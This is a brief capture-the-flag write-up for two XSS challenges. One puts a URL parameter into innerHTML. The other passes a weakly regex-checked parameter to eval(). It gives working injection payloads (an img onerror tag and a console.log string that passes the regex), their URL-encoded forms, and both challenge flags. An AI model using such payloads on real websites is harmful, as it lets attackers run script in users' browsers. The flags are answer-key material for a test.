---
ai_date: '2025-04-27 05:26:27'
ai_summary: XSS exploitation using `img.onerror` in the first challenge and regex-based
  `eval()` in the second challenge.
ai_tags:
- xss
- regex
- eval
created: 2025-03-01T14:15
points: 100
solves: 22
updated: 2025-03-18T02:31
---

## XSS 1

```js
window.onload = () => {
	const urlParams = new URLSearchParams(window.location.search);
	let helloParam = urlParams.get('hello');
	if (!helloParam) {
		helloParam = '@Hack 2025'; // Default value
	}
	document.getElementById('hello').innerHTML = helloParam;
};
```

To exploit this we simply use `img.onerror`.

```html
<img src=0 onerror=console('I_FOUND_AN_XSS!!!')>
```

```
hello=%3Cimg%20src=0%20onerror=console.log(%22I_FOUND_AN_XSS!!!%22)%3E
```

```flag
ATHACKCTF{0xAAY0U_DID_FIND_AN_X55_HA0xFFHAHA}
```

## XSS 2

```js
function isValidMathExpression(input) {
	const regex = /^(.+[\+,\-,\*,\/].+)$/gm;
	return regex.test(input);
}
```

We just need to match the regex and the url param will be `eval()`ed.

```js
console.log('I_FOUND_AN_XSS!!!');-2
```

```
display=console.log(%22I_FOUND_AN_XSS!!!%22);-2
```

```flag
ATHACKCTF{R3g3X5S_IS_N0T_EN0uGH_0x7F}
```